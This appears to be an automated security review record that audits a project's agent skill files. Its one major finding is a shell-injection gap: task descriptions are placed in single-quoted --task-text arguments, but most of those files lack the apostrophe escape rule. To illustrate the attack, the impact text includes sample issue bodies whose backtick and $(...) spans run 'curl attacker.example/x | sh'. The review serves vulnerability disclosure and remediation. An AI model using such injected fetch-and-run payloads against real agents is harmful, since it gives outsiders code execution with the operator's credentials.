@@ -1,0 +1,47 @@
+STATUS: DONE_WITH_CONCERNS
+REVIEW_RESULT
+```json
+{
+  "status": "DONE_WITH_CONCERNS",
+  "reviewer": "review-security-code",
+  "summary": "Slice-02 (r03 delta d6267d4..5382b56: context-resolver.ts, reference-entries.ts, reference-proof.ts, references-check.ts, references-section.ts, project-context-inspector.ts, tui-shell.ts, five skill instruction files with managed copies, README/docs, tests, flow bookkeeping) read in the slice diff, the delta diff and at head. Closed by this delta: r02 review-security-code-w4:F-001 and w1:F-002 (the last-resolve record now holds taskTextLength/taskTextTruncated, never the text; nothing else in src writes the text), r02 w3:F-001 and w1:F-001 (parseHeadingLine/stripClosingHashes are linear; no regex with a lazy group before a blank run is left), r02 w5:F-001 (paint() maps every line through cardSafe, the sidebar value too; the only callers of the format* functions are the modal and the sidebar; 52 tests in project-context-inspector, references-section and reference-entries pass). keywordOccurs builds its RegExp from an escaped keyword with fixed lookarounds: no backtracking risk. Not re-filed, still applying unchanged: r02 w3:F-003 / w1:F-003 (reference-proof.ts:53 reads entry.path from the --resolved JSON with no containment, info), r02 w3:F-002 (reference-entries.ts prints heading text in a warning, info), r02 w4:F-003 (src/lib/args.ts, not in this slice). Already filed this round by w6 and still valid on slice-02 files: review-security-code-w6:F-001 (references-check.ts:105 unbounded readFile of a link origin, now polled by the TUI) and review-security-code-w6:F-002 (cardSafe weaker than terminalSafe at project-context-inspector.ts). One new finding: the r02 shell-injection major (w4:F-002) was fixed by switching to single quotes, but the escape rule that makes single quotes safe was added at one of the instruction sites only.",
+  "findings": [
+    {
+      "id": "F-001",
+      "severity": "major",
+      "file": "src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md",
+      "line": 182,
+      "quote": "--task-text '<task.description>'",
+      "problem": "r02 review-security-code-w4:F-002 reported that the skills tell the executing agent to put the task title and description into a double-quoted shell argument, where backticks and $(...) still run. This delta changes the quote character to single quotes in every instruction, but only flow-orchestrator/SKILL.md:323 (and its bundled copy) adds the sentence that makes single quotes safe: \"Write the text single-quoted (a ' inside it becomes '\\'')\". The other instructions give the bare form with no escape rule: task-implementer/SKILL.md:182 (--task-text '<task.description>'), tests-creator/SKILL.md:93 (--task-text '<task description>'), job-orchestrator/SKILL.md:749 and :1307, job-orchestrator/orchestrator-prompt.md:132 and :188, and README.md:270. Single quotes protect only until the first ' in the text. A task description is free markdown prose: \"don't\", \"the user's\" or \"it's\" ends the quote, and the rest of the description is then parsed by the shell unquoted, where the backticks and $(...) that markdown descriptions carry run as commands. The flow-orchestrator placeholder itself reads '<the task's title and description>', an apostrophe inside the quoted placeholder. The CLI still has no stdin or file route for the text (optionValue in src/lib/args.ts takes the next argv token), so argv quoting is the only path and the instruction is the only guard.",
+      "impact": "Attack vector: task titles and descriptions reach these dispatches from analysed issues and PR text that outsiders can write, and from job analysis output. An issue body such as \"Don't touch `curl https://attacker.example/x | sh`\" or \"it's broken $(curl attacker.example/x|sh)\" is substituted into --task-text '...' by the agent following the instruction; the apostrophe closes the quote and the backtick or $(...) span executes in the agent's shell with the operator's credentials and working tree. Even without an attacker, every apostrophe in an ordinary description yields a malformed command (unterminated quote or split arguments), so the resolve step fails or silently receives a cut text and keyword promotion does not happen. The fix in the one orchestrator shows the rule is known; the workers that run inside a dispatch (task-implementer, tests-creator) and the job orchestrator are the ones without it.",
+      "suggested_fix": "Put the escape rule at every site that tells an agent to build the command, or better, remove the need for quoting. Minimal: in task-implementer 2.0c, tests-creator 1.2b, job-orchestrator (both places), orchestrator-prompt (both places) and the README sentence, repeat \"write the text single-quoted; every ' inside it becomes '\\''\", and change the flow-orchestrator placeholder to '<task title and description>' without the apostrophe. Sturdier: give resolve-context a way to read the text from a file or stdin (for example --task-text-file <path>) and have the instructions write the text to a file first, as --out already does for the result, so no description byte is ever parsed by the shell. Keep the managed copies in .metaproject/skills in sync with src/gdskills/bundled (skill-sync.test.ts) and add a test that every skill line containing --task-text also names the escape rule or the file option.",
+      "evidence": "Counts at head of the escape sentence vs. the bare single-quoted form: flow-orchestrator/SKILL.md 1 site, rule present; job-orchestrator/SKILL.md 2 sites, rule absent; job-orchestrator/orchestrator-prompt.md 2 sites, rule absent; task-implementer/SKILL.md 1 site, rule absent; tests-creator/SKILL.md 1 site, rule absent; README.md 1 site, rule absent (python over the files). Each skill file has a byte-identical copy under src/gdskills/bundled/skills (cmp on task-implementer confirms). The delta diff d6267d4..5382b56 for the skill files shows only the quote character change, except flow-orchestrator, which also gains the sentence. src/lib/args.ts optionValue shows no stdin or file route.",
+      "confidence": "high",
+      "reviewer": "review-security-code",
+      "class_scope": {
+        "sites": [
+          ".metaproject/skills/gdskills/orchestration/task-implementer/SKILL.md:182 and src/gdskills/bundled/skills/orchestration/task-implementer/SKILL.md:182",
+          ".metaproject/skills/gdskills/quality/tests-creator/SKILL.md:93 and src/gdskills/bundled/skills/quality/tests-creator/SKILL.md:93",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/SKILL.md:749 and :1307, and the bundled copy",
+          ".metaproject/skills/gdskills/orchestration/job-orchestrator/orchestrator-prompt.md:132 and :188, and the bundled copy",
+          "README.md:270",
+          ".metaproject/skills/gdskills/orchestration/flow-orchestrator/SKILL.md:323 and bundled copy (has the rule, but the placeholder holds an apostrophe)",
+          "docs/docs/guides/apply-project-rules.md:172 and docs/requirements/keryx-conditional-reads/live-run.md:136,155,170 are fixed double-quoted literals typed by an operator; not part of the class"
+        ],
+        "enumeration_method": "Scanned every tracked file outside .metaproject/{reviews,data,flows} for --task-text followed by a quote character (python over git ls-files), then checked each file for the '\\'' escape sentence. 8 instruction sites (each skill file with a bundled copy) plus README and 4 operator-typed doc examples; only the flow-orchestrator file carries the rule."
+      }
+    }
+  ],
+  "prior_dispositions": [],
+  "stats": { "blocker": 0, "major": 1, "minor": 0, "info": 0 },
+  "slices": [
+    { "id": "slice-02", "coverage": "All 52 hunks of the slice read; delta source files (context-resolver.ts, reference-entries.ts, reference-proof.ts, references-check.ts, references-section.ts, project-context-inspector.ts, tui-shell.ts, skills.ts) read as delta diff and at head; skill and doc instruction changes checked across all sites; flow.json, journal and acceptance-criteria bookkeeping read (AC3 rewrite under operator poll 218, no sensitive content).", "status": "DONE" }
+  ],
+  "needs_context": [],
+  "inputs_unreadable": []
+}
+```
+
+Round notes. Checked with no finding in slice-02: injection other than F-001 (no shell, SQL or eval in the changed source), auth and IDOR (none), secrets (the last-resolve record no longer stores task text; no secret in the bookkeeping), crypto (none), CSRF and open redirect (none), path traversal (reference-proof.ts:53 unchanged, see r02 w3:F-003; the references-check.ts link origin read is w6:F-001), ReDoS (parseHeadingLine, stripClosingHashes and keywordOccurs are linear), terminal escape injection (closed by cardSafe; the residual gap is w6:F-002).
+
+Routing audit: graph_used: no (not-relevant, bounded diff review); wiki_used: no (not-relevant); ctx_used: yes (keryx ctx read/rg); raw_rg_used: no (raw git diff used with keryx:raw marker for delta extraction).
